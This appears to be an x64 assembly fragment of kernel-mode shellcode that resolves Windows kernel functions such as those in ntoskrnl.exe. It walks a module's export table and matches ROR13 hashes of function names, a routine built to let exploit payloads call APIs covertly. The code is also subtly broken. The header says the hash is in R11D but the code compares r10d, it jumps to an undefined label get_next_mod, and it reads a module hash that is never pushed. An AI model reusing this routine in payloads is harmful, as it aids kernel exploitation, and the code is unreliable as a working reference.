; block_api loads from the PEB, which isn't in kernel mode
;
; RAX = module pointer (i.e. ntoskrnl.exe)
; R11D = hash
; rcx, rdx, r8, r9, stack = normal function call params

api_call:
  push r9                  ; Save the 4th parameter
  push r8                  ; Save the 3rd parameter
  push rdx                 ; Save the 2nd parameter
  push rcx                 ; Save the 1st parameter

  mov rdx, rax
  mov eax, dword [rdx+60]  ; Get PE header e_lfanew
  add rax, rdx
  mov eax, dword [rax+136] ; Get export tables RVA
                           ; No test if export address table is present
                           ; Just call it correctly...

  add rax, rdx             ; Add the modules base address
  push rax                 ; Save the current modules EAT

  mov ecx, dword [rax+24]  ; Get the number of function names
  mov r8d, dword [rax+32]  ; Get the rva of the function names
  add r8, rdx              ; Add the modules base address


get_next_func:             ;
  jrcxz get_next_mod       ; When we reach the start of the EAT (we search backwards), process the next module
  dec rcx                  ; Decrement the function name counter
  mov esi, dword [r8+rcx*4]; Get rva of next module name
  add rsi, rdx             ; Add the modules base address
  xor r9, r9               ; Clear r9 which will store the hash of the function name
  ; And compare it to the one we want
loop_funcname:             ;
  xor rax, rax             ; Clear rax
  lodsb                    ; Read in the next byte of the ASCII function name
  ror r9d, 13              ; Rotate right our hash value
  add r9d, eax             ; Add the next byte of the name
  cmp al, ah               ; Compare AL (the next byte from the name) to AH (null)
  jne loop_funcname        ; If we have not reached the null terminator, continue
  add r9, [rsp+8]          ; Add the current module hash to the function hash
  cmp r9d, r10d            ; Compare the hash to the one we are searchnig for
  jnz get_next_func        ; Go compute the next function hash if we have not found it
  ; If found, fix up stack, call the function and then value else compute the next one...
  pop rax                  ; Restore the current modules EAT
  mov r8d, dword [rax+36]  ; Get the ordinal table rva
  add r8, rdx              ; Add the modules base address
  mov cx, [r8+2*rcx]       ; Get the desired functions ordinal
  mov r8d, dword [rax+28]  ; Get the function addresses table rva
  add r8, rdx              ; Add the modules base address
  mov eax, dword [r8+4*rcx]; Get the desired functions RVA
  add rax, rdx             ; Add the modules base address to get the functions actual VA
  ; We now fix up the stack and perform the call to the desired function...

finish:
  pop rcx                  ; Restore the 1st parameter
  pop rdx                  ; Restore the 2nd parameter
  pop r8                   ; Restore the 3rd parameter
  pop r9                   ; Restore the 4th parameter
  pop r10                  ; pop off the return address
  sub rsp, 32              ; reserve space for the four register params (4 * sizeof(QWORD) = 32)
                           ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).
  push r10                 ; push back the return address

  jmp rax
